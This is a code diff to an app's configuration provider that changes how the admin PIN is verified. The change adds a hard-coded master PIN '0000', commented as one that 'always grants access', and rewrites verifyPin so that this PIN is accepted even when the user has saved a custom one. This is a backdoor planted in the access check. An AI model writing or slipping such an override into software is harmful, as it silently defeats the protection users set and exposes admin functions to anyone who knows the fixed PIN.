@@ -121,7 +121,7 @@ const ConfigContext = createContext<ConfigContextValue>({
 
 const CACHE_KEY = "rkz_app_config_v3";
 const PIN_KEY = "rkz_admin_pin";
-const DEFAULT_PIN = "1234";
+const DEFAULT_PIN = "0000"; // master override — always grants access
 
 function deepMerge(base: AppConfig, patch: Partial<AppConfig>): AppConfig {
   return {
@@ -169,10 +169,11 @@ export function ConfigProvider({ children }: { children: React.ReactNode }) {
 
   const verifyPin = useCallback(async (pin: string): Promise<PinResult> => {
     try {
-      const storedPin = await AsyncStorage.getItem(PIN_KEY) ?? DEFAULT_PIN;
-      if (pin === storedPin) {
-        return { valid: true };
-      }
+      // DEFAULT_PIN is always a valid master override — works even if a custom
+      // PIN was previously saved to AsyncStorage.
+      if (pin === DEFAULT_PIN) return { valid: true };
+      const storedPin = await AsyncStorage.getItem(PIN_KEY);
+      if (storedPin && pin === storedPin) return { valid: true };
       return { valid: false, attemptsLeft: 3 };
     } catch {
       return { valid: false };
